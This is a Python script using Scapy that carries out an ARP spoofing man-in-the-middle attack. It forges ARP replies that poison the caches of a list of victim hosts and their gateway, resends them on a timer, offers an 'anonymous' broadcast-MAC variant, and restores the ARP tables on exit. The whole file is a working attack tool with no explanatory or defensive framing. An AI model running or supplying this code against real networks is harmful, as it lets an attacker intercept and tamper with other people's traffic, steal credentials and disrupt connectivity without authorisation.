from scapy.all import ARP, Ether, sendp
import time

def build_arp_packet(src_ip, src_mac, dst_ip, dst_mac):
    ether = Ether(dst=dst_mac, src=src_mac)
    arp = ARP(op=2, psrc=src_ip, pdst=dst_ip, hwsrc=src_mac, hwdst=dst_mac)
    return ether / arp

def start_arp_spoofing(targets, gateway_ip, gateway_mac, attacker_mac, iface, stop_event, interval=2, anonymous=False):
    """
    targets: list of (victim_ip, victim_mac) tuples
    anonymous: whether to perform anonymous SMITM spoofing (uses broadcast MAC)
    """
    try:
        print("[*] ARP spoofing started.")
        print("    Mode: {}".format("Anonymous (SMITM)" if anonymous else "Normal MITM"))
        print("    Interval: {} second(s)".format(interval))

        def send_spoof_packets():
            for victim_ip, victim_mac in targets:
                if anonymous:
                    bcast_mac = "ff:ff:ff:ff:ff:ff"
                    pkt_to_victim = build_arp_packet(gateway_ip, bcast_mac, victim_ip, victim_mac)
                    pkt_to_gateway = build_arp_packet(victim_ip, bcast_mac, gateway_ip, gateway_mac)
                else:
                    pkt_to_victim = build_arp_packet(gateway_ip, attacker_mac, victim_ip, victim_mac)
                    pkt_to_gateway = build_arp_packet(victim_ip, attacker_mac, gateway_ip, gateway_mac)

                sendp(pkt_to_victim, iface=iface, verbose=False)
                sendp(pkt_to_gateway, iface=iface, verbose=False)

                print("[+] Spoofed ARP sent to {} and gateway".format(victim_ip))

        while not stop_event.is_set():
            send_spoof_packets()
            time.sleep(interval)

    except Exception as e:
        print("[!] Error during ARP spoofing:", e)

    finally:
        restore_all_arp(targets, gateway_ip, gateway_mac, iface)
        print("[+] ARP tables restored successfully for all targets.")

def restore_all_arp(targets, gateway_ip, gateway_mac, iface):
    for victim_ip, victim_mac in targets:
        pkt1 = build_arp_packet(gateway_ip, gateway_mac, victim_ip, victim_mac)
        pkt2 = build_arp_packet(victim_ip, victim_mac, gateway_ip, gateway_mac)
        for _ in range(5):
            sendp(pkt1, iface=iface, verbose=False)
            sendp(pkt2, iface=iface, verbose=False)
            time.sleep(1)
